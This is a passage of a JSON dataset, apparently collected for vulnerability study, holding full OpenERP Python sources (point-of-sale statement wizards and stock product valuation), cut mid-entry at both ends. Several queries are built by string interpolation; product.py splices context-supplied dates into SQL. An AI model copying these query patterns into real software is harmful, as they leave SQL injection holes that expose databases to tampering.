data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n        return {\n                'domain': \"[('id','in',\" + str(list_statement) + \")]\",\n                'name': 'Close Statements',\n                'view_type': 'form',\n                'view_mode': 'tree,form',\n                'res_model': 'account.bank.statement',\n                'views': [(id2, 'tree'),(id3, 'form')],\n                'type': 'ir.actions.act_window'}\n\npos_close_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/akretion/openerp-addons-ci/blob/4ad703b1c353a8318094d79ca0dfea34e7f05e27",
        "file_path": "/point_of_sale/wizard/pos_open_statement.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\nimport time\n\nclass pos_open_statement(osv.osv_memory):\n    _name = 'pos.open.statement'\n    _description = 'Open Statements'\n\n    def open_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Open the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Directory\n        \"\"\"\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        statement_obj = self.pool.get('account.bank.statement')\n        sequence_obj = self.pool.get('ir.sequence')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if len(ids):\n                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for \"%s\". \\n Please close the cashbox related to. ' %(journal.name)))\n            \n#            cr.execute(\"\"\" Select id from account_bank_statement\n#                                    where journal_id =%d\n#                                    and company_id =%d\n#                                    order by id desc limit 1\"\"\" %(journal.id, company_id))\n#            st_id = cr.fetchone()\n            \n            number = ''\n            if journal.sequence_id:\n                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)\n            else:\n                number = sequence_obj.get(cr, uid, 'account.bank.statement')\n            \n            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,\n                                                          'company_id': company_id,\n                                                          'user_id': uid,\n                                                          'state': 'open',\n                                                          'name': number,\n                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),\n                                                      })\n            statement_obj.button_open(cr, uid, [statement_id], context)\n\n    #            period = statement_obj._get_period(cr, uid, context) or None\n    #            cr.execute(\"INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')\"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))\n    #            cr.commit()\n    #            cr.execute(\"select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'\"%(journal.id, company_id, uid, number))\n    #            statement_id = cr.fetchone()[0]\n    #            print \"statement_id\",statement_id\n    #            if st_id:\n    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])\n    #                list_statement.append(statemt_id.id)\n    #                if statemt_id and statemt_id.ending_details_ids:\n    #                    statement_obj.write(cr, uid, [statement_id], {\n    #                        'balance_start': statemt_id.balance_end,\n    #                        'state': 'open',\n    #                    })\n    #                    if statemt_id.ending_details_ids:\n    #                        for i in statemt_id.ending_details_ids:\n    #                            c = statement_obj.create(cr, uid, {\n    #                                'pieces': i.pieces,\n    #                                'number': i.number,\n    #                                'starting_id': statement_id,\n    #                            })\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n\n        return {\n#           'domain': \"[('id','in', [\"+','.join(map(str,list_statement))+\"])]\",\n            'domain': \"[('state','=','open')]\",\n            'name': 'Open Statement',\n            'view_type': 'form',\n            'view_mode': 'tree,form',\n            'res_model': 'account.bank.statement',\n            'views': [(id2, 'tree'),(id3, 'form')],\n            'type': 'ir.actions.act_window'\n}\npos_open_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/akretion/openerp-addons-ci/blob/de89977dbb3cc6265876e071f8a6219eb602b4af",
        "file_path": "/stock/product.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import fields, osv\nfrom tools.translate import _\n\nclass product_product(osv.osv):\n    _inherit = \"product.product\"\n\n    def get_product_accounts(self, cr, uid, product_id, context=None):\n        \"\"\" To get the stock input account, stock output account and stock journal related to product.\n        @param product_id: product id\n        @return: dictionary which contains information regarding stock input account, stock output account and stock journal\n        \"\"\"\n        if context is None:\n            context = {}\n        product_obj = self.pool.get('product.product').browse(cr, uid, product_id, context=context)\n\n        stock_input_acc = product_obj.property_stock_account_input and product_obj.property_stock_account_input.id or False\n        if not stock_input_acc:\n            stock_input_acc = product_obj.categ_id.property_stock_account_input_categ and product_obj.categ_id.property_stock_account_input_categ.id or False\n\n        stock_output_acc = product_obj.property_stock_account_output and product_obj.property_stock_account_output.id or False\n        if not stock_output_acc:\n            stock_output_acc = product_obj.categ_id.property_stock_account_output_categ and product_obj.categ_id.property_stock_account_output_categ.id or False\n\n        journal_id = product_obj.categ_id.property_stock_journal and product_obj.categ_id.property_stock_journal.id or False\n        account_variation = product_obj.categ_id.property_stock_variation and product_obj.categ_id.property_stock_variation.id or False\n\n        return {\n            'stock_account_input': stock_input_acc,\n            'stock_account_output': stock_output_acc,\n            'stock_journal': journal_id,\n            'property_stock_variation': account_variation\n        }\n\n    def do_change_standard_price(self, cr, uid, ids, datas, context={}):\n        \"\"\" Changes the Standard Price of Product and creates an account move accordingly.\n        @param datas : dict. contain default datas like new_price, stock_output_account, stock_input_account, stock_journal\n        @param context: A standard dictionary\n        @return:\n\n        \"\"\"\n        location_obj = self.pool.get('stock.location')\n        move_obj = self.pool.get('account.move')\n        move_line_obj = self.pool.get('account.move.line')\n\n        new_price = datas.get('new_price', 0.0)\n        stock_output_acc = datas.get('stock_output_account', False)\n        stock_input_acc = datas.get('stock_input_account', False)\n        journal_id = datas.get('stock_journal', False)\n        product_obj=self.browse(cr,uid,ids)[0]\n        account_variation = product_obj.categ_id.property_stock_variation\n        account_variation_id = account_variation and account_variation.id or False\n        if not account_variation_id: raise osv.except_osv(_('Error!'), _('Variation Account is not specified for Product Category: %s' % (product_obj.categ_id.name)))\n        move_ids = []\n        loc_ids = location_obj.search(cr, uid,[('usage','=','internal')])\n        for rec_id in ids:\n            for location in location_obj.browse(cr, uid, loc_ids):\n                c = context.copy()\n                c.update({\n                    'location': location.id,\n                    'compute_child': False\n                })\n\n                product = self.browse(cr, uid, rec_id, context=c)\n                qty = product.qty_available\n                diff = product.standard_price - new_price\n                if not diff: raise osv.except_osv(_('Error!'), _(\"Could not find any difference between standard price and new price!\"))\n                if qty:\n                    company_id = location.company_id and location.company_id.id or False\n                    if not company_id: raise osv.except_osv(_('Error!'), _('Company is not specified in Location'))\n                    #\n                    # Accounting Entries\n                    #\n                    if not journal_id:\n                        journal_id = product.categ_id.property_stock_journal and product.categ_id.property_stock_journal.id or False\n                    if not journal_id:\n                        raise osv.except_osv(_('Error!'),\n                            _('There is no journal defined '\\\n                                'on the product category: \"%s\" (id: %d)') % \\\n                                (product.categ_id.name,\n                                    product.categ_id.id,))\n                    move_id = move_obj.create(cr, uid, {\n                                'journal_id': journal_id,\n                                'company_id': company_id\n                                })\n\n                    move_ids.append(move_id)\n\n\n                    if diff > 0:\n                        if not stock_input_acc:\n                            stock_input_acc = product.product_tmpl_id.\\\n                                property_stock_account_input.id\n                        if not stock_input_acc:\n                            stock_input_acc = product.categ_id.\\\n                                    property_stock_account_input_categ.id\n                        if not stock_input_acc:\n                            raise osv.except_osv(_('Error!'),\n                                    _('There is no stock input account defined ' \\\n                                            'for this product: \"%s\" (id: %d)') % \\\n                                            (product.name,\n                                                product.id,))\n                        amount_diff = qty * diff\n                        move_line_obj.create(cr, uid, {\n                                    'name': product.name,\n                                    'account_id': stock_input_acc,\n                                    'debit': amount_diff,\n                                    'move_id': move_id,\n                                    })\n                        move_line_obj.create(cr, uid, {\n                                    'name': product.categ_id.name,\n                                    'account_id': account_variation_id,\n                                    'credit': amount_diff,\n                                    'move_id': move_id\n                                    })\n                    elif diff < 0:\n                        if not stock_output_acc:\n                            stock_output_acc = product.product_tmpl_id.\\\n                                property_stock_account_output.id\n                        if not stock_output_acc:\n                            stock_output_acc = product.categ_id.\\\n                                    property_stock_account_output_categ.id\n                        if not stock_output_acc:\n                            raise osv.except_osv(_('Error!'),\n                                    _('There is no stock output account defined ' \\\n                                            'for this product: \"%s\" (id: %d)') % \\\n                                            (product.name,\n                                                product.id,))\n                        amount_diff = qty * -diff\n                        move_line_obj.create(cr, uid, {\n                                        'name': product.name,\n                                        'account_id': stock_output_acc,\n                                        'credit': amount_diff,\n                                        'move_id': move_id\n                                    })\n                        move_line_obj.create(cr, uid, {\n                                        'name': product.categ_id.name,\n                                        'account_id': account_variation_id,\n                                        'debit': amount_diff,\n                                        'move_id': move_id\n                                    })\n\n            self.write(cr, uid, rec_id, {'standard_price': new_price})\n\n        return move_ids\n\n    def view_header_get(self, cr, user, view_id, view_type, context=None):\n        if context is None:\n            context = {}\n        res = super(product_product, self).view_header_get(cr, user, view_id, view_type, context)\n        if res: return res\n        if (context.get('active_id', False)) and (context.get('active_model') == 'stock.location'):\n            return _('Products: ')+self.pool.get('stock.location').browse(cr, user, context['active_id'], context).name\n        return res\n\n    def get_product_available(self, cr, uid, ids, context=None):\n        \"\"\" Finds whether product is available or not in particular warehouse.\n        @return: Dictionary of values\n        \"\"\"\n        if context is None:\n            context = {}\n        states = context.get('states',[])\n        what = context.get('what',())\n        if not ids:\n            ids = self.search(cr, uid, [])\n        res = {}.fromkeys(ids, 0.0)\n        if not ids:\n            return res\n\n        if context.get('shop', False):\n            cr.execute('select warehouse_id from sale_shop where id=%s', (int(context['shop']),))\n            res2 = cr.fetchone()\n            if res2:\n                context['warehouse'] = res2[0]\n\n        if context.get('warehouse', False):\n            cr.execute('select lot_stock_id from stock_warehouse where id=%s', (int(context['warehouse']),))\n            res2 = cr.fetchone()\n            if res2:\n                context['location'] = res2[0]\n\n        if context.get('location', False):\n            if type(context['location']) == type(1):\n                location_ids = [context['location']]\n            elif type(context['location']) in (type(''), type(u'')):\n                location_ids = self.pool.get('stock.location').search(cr, uid, [('name','ilike',context['location'])], context=context)\n            else:\n                location_ids = context['location']\n        else:\n            location_ids = []\n            wids = self.pool.get('stock.warehouse').search(cr, uid, [], context=context)\n            for w in self.pool.get('stock.warehouse').browse(cr, uid, wids, context=context):\n                location_ids.append(w.lot_stock_id.id)\n\n        # build the list of ids of children of the location given by id\n        if context.get('compute_child',True):\n            child_location_ids = self.pool.get('stock.location').search(cr, uid, [('location_id', 'child_of', location_ids)])\n            location_ids = child_location_ids or location_ids\n        else:\n            location_ids = location_ids\n\n        uoms_o = {}\n        product2uom = {}\n        for product in self.browse(cr, uid, ids, context=context):\n            product2uom[product.id] = product.uom_id.id\n            uoms_o[product.uom_id.id] = product.uom_id\n\n        results = []\n        results2 = []\n\n        from_date=context.get('from_date',False)\n        to_date=context.get('to_date',False)\n        date_str=False\n        if from_date and to_date:\n            date_str=\"date_planned>='%s' and date_planned<='%s'\"%(from_date,to_date)\n        elif from_date:\n            date_str=\"date_planned>='%s'\"%(from_date)\n        elif to_date:\n            date_str=\"date_planned<='%s'\"%(to_date)\n\n        if 'in' in what:\n            # all moves from a location out of the set to a location in the set\n            cr.execute(\n                'select sum(product_qty), product_id, product_uom '\\\n                'from stock_move '\\\n                'where location_id NOT IN %s'\\\n                'and location_dest_id IN %s'\\\n                'and product_id IN %s'\\\n                'and state IN %s' + (date_str and 'and '+date_str+' ' or '') +''\\\n                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)\n            )\n            results = cr.fetchall()\n        if 'out' in what:\n            # all moves from a location in the set to a location out of the set\n            cr.execute(\n                'select sum(product_qty), product_id, product_uom '\\\n                'from stock_move '\\\n                'where location_id IN %s'\\\n                'and location_dest_id NOT IN %s '\\\n                'and product_id  IN %s'\\\n                'and state in %s' + (date_str and 'and '+date_str+' ' or '') + ''\\\n                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)\n            )\n            results2 = cr.fetchall()\n        uom_obj = self.pool.get('product.uom')\n        uoms = map(lambda x: x[2], results) + map(lambda x: x[2], results2)\n        if context.get('uom', False):\n            uoms += [context['uom']]\n\n        uoms = filter(lambda x: x not in uoms_o.keys(), uoms)\n        if uoms:\n            uoms = uom_obj.browse(cr, uid, list(set(uoms)), context=context)\n        for o in uoms:\n            uoms_o[o.id] = o\n        for amount, prod_id, prod_uom in results:\n            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,\n                    uoms_o[context.get('uom', False) or product2uom[prod_id]])\n            res[prod_id] += amount\n        for amount, prod_id, prod_uom in results2:\n            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,\n                    uoms_o[context.get('uom', False) or product2uom[prod_id]])\n            res[prod_id] -= amount\n        return res\n\n    def _product_available(self, cr, uid, ids, field_names=None, arg=False, context=None):\n        \"\"\" Finds the incoming and outgoing quantity of product.\n        @return: Dictionary of values\n        \"\"\"\n        if not field_names:\n            field_names = []\n        if context is None:\n            context = {}\n        res = {}\n        for id in ids:\n            res[id] = {}.fromkeys(field_names, 0.0)\n        for f in field_names:\n            c = context.copy()\n            if f == 'qty_available':\n                c.update({ 'states': ('done',), 'what': ('in', 'out') })\n            if f == 'virtual_available':\n                c.update({ 'states': ('confirmed','waiting','assigned','done'), 'what': ('in', 'out') })\n            if f == 'incoming_qty':\n                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('in',) })\n            if f == 'outgoing_qty':\n                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('out',) })\n            stock = self.get_product_available(cr, uid, ids, context=c)\n            for id in ids:\n                res[id][f] = stock.get(id, 0.0)\n        return res\n\n    _columns = {\n        'qty_available': fields.function(_product_available, method=True, type='float', string='Real Stock', help=\"Current quantities of products in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'virtual_available': fields.function(_product_available, method=True, type='float', string='Virtual Stock', help=\"Future stock for this product according to the selected locations or all internal if none have been selected. Computed as: Real Stock - Outgoing + Incoming.\", multi='qty_available'),\n        'incoming_qty': fields.function(_product_available, method=True, type='float', string='Incoming', help=\"Quantities of products that are planned to arrive in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'outgoing_qty': fields.function(_product_available, method=True, type='float', string='Outgoing', help=\"Quantities of products that are planned to leave in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'track_production': fields.boolean('Track Manufacturing Lots' , help=\"Forces to specify a Production Lot for all moves containing this product and generated by a Manufacturing Order\"),\n        'track_incoming': fields.boolean('Track Incoming Lots', help=\"Forces to specify a Production Lot for all moves containing this product and coming from a Supplier Location\"),\n        'track_outgoing': fields.boolean('Track Outgoing Lots', help=\"Forces to specify a Production Lot for all moves containing this product and going to a Customer Location\"),\n        'location_id': fields.dummy(string='Stock Location', relation='stock.location', type='many2one'),\n        'valuation':fields.selection([('manual_periodic', 'Periodical (manual)'),\n                                        ('real_time','Real Time (automated)'),], 'Inventory Valuation', \n                                        help=\"If real-time valuation is enabled for a product, the system will automatically write journal entries corresponding to stock moves.\" \\\n                                             \"The inventory variation account set on the product category will represent the current inventory value, and the stock input and stock output account will hold the counterpart moves for incoming and outgoing products.\"\n                                        , required=True),\n    }\n\n    _defaults = {\n        'valuation': lambda *a: 'manual_periodic',\n    }\n\n    def fields_view_get(self, cr, uid, view_id=None, view_type='form', context=None, toolbar=False, submenu=False):\n        res = super(product_product,self).fields_view_get(cr, uid, view_id, view_type, context, toolbar=toolbar, submenu=submenu)\n        if context is None:\n            context = {}\n        if ('location' in context) and context['location']:\n            location_info = self.pool.get('stock.location').browse(cr, uid, context['location'])\n            fields=res.get('fields',{})\n            if fields:\n                if location_info.usage == 'supplier':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Receptions')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Received Qty')\n\n                if location_info.usage == 'internal':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Stock')\n\n                if location_info.usage == 'customer':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Deliveries')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Delivered Qty')\n\n                if location_info.usage == 'inventory':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future P&L')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('P&L Qty')\n\n                if location_info.usage == 'procurement':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Qty')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Unplanned Qty')\n\n                if location_info.usage == 'production':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Productions')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Produced Qty')\n        return res\n\nproduct_product()\n\nclass product_template(osv.osv):\n    _name = 'product.template'\n    _inherit = 'product.template'\n    _columns = {\n        'property_stock_procurement': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Procurement Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','procurement')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by procurements\"),\n        'property_stock_production': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Production Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','production')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by production orders\"),\n        'property_stock_inventory': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Inventory Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','inventory')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated when you do an inventory\"),\n        'property_stock_account_input': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Input Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),\n        'property_stock_account_output': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Output Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),\n    }\n\nproduct_template()\n\nclass product_category(osv.osv):\n\n    _inherit = 'product.category'\n    _columns = {\n        'property_stock_journal': fields.property('account.journal',\n            relation='account.journal', type='many2one',\n            string='Stock journal', method=True, view_load=True,\n            help=\"When doing real-time inventory valuation, this is the Accounting Journal in which entries will be automatically posted when stock moves are processed.\"),\n        'property_stock_account_input_categ': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Input Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),\n        'property_stock_account_output_categ': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Output Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),\n        'property_stock_variation': fields.property('account.account',\n            type='many2one',\n            relation='account.account',\n            string=\"Stock Variation Account\",\n            method=True, view_load=True,\n            help=\"When real-time inventory valuation is enabled on a product, this account will hold the current value of the products.\",),\n    }\n\nproduct_category()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/splbio/openobject-addons/blob/979db90c43ba0050400b0a5c8ad5da7ecc2bd76f",
        "file_path": "/point_of_sale/wizard/pos_close_statement.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\n\nclass pos_close_statement(osv.osv_memory):\n    _name = 'pos.close.statement'\n    _description = 'Close Statements'\n\n    def close_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Close the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Dictionary\n        \"\"\"\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        statement_obj = self.pool.get('account.bank.statement')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if not ids:\n                raise osv.except_osv(_('Message'), _('Journals are already closed'))\n            else:\n                list_statement.append(ids[0])\n                if not journal.check_dtls:\n                    statement_obj.button_confirm_cash(cr, uid, ids, context)\n    #        if not list_statement:\n    #            return {}\n    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)\n    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n        return {\n                'domain': \"[('id','in',\" + str(list_statement) + \")]\",\n                'name': 'Close Statements',\n                'view_type': 'form',\n                'view_mode': 'tree,form',\n                'res_model': 'account.bank.statement',\n                'views': [(id2, 'tree'),(id3, 'form')],\n                'type': 'ir.actions.act_window'}\n\npos_close_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/splbio/openobject-addons/blob/979db90c43ba0050400b0a5c8ad5da7ecc2bd76f",
        "file_path": "/point_of_sale/wizard/pos_open_statement.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\nimport time\n\nclass pos_open_statement(osv.osv_memory):\n    _name = 'pos.open.statement'\n    _description = 'Open Statements'\n\n    def open_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Open the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Directory\n        \"\"\"\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        statement_obj = self.pool.get('account.bank.statement')\n        sequence_obj = self.pool.get('ir.sequence')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if len(ids):\n                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for \"%s\". \\n Please close the cashbox related to. ' %(journal.name)))\n            \n#            cr.execute(\"\"\" Select id from account_bank_statement\n#                                    where journal_id =%d\n#                                    and company_id =%d\n#                                    order by id desc limit 1\"\"\" %(journal.id, company_id))\n#            st_id = cr.fetchone()\n            \n            number = ''\n            if journal.sequence_id:\n                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)\n            else:\n                number = sequence_obj.get(cr, uid, 'account.bank.statement')\n            \n            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,\n                                                          'company_id': company_id,\n                                                          'user_id': uid,\n                                                          'state': 'open',\n                                                          'name': number,\n                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),\n                                                      })\n            statement_obj.button_open(cr, uid, [statement_id], context)\n\n    #            period = statement_obj._get_period(cr, uid, context) or None\n    #            cr.execute(\"INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')\"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))\n    #            cr.commit()\n    #            cr.execute(\"select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'\"%(journal.id, company_id, uid, number))\n    #            statement_id = cr.fetchone()[0]\n    #            print \"statement_id\",statement_id\n    #            if st_id:\n    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])\n    #                list_statement.append(statemt_id.id)\n    #                if statemt_id and statemt_id.ending_details_ids:\n    #                    statement_obj.write(cr, uid, [statement_id], {\n    #                        'balance_start': statemt_id.balance_end,\n    #                        'state': 'open',\n    #                    })\n    #                    if statemt_id.ending_details_ids:\n    #                        for i in statemt_id.ending_details_ids:\n    #                            c = statement_obj.create(cr, uid, {\n    #                                'pieces': i.pieces,\n    #                                'number': i.number,\n    #                                'starting_id': statement_id,\n    #                            })\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = 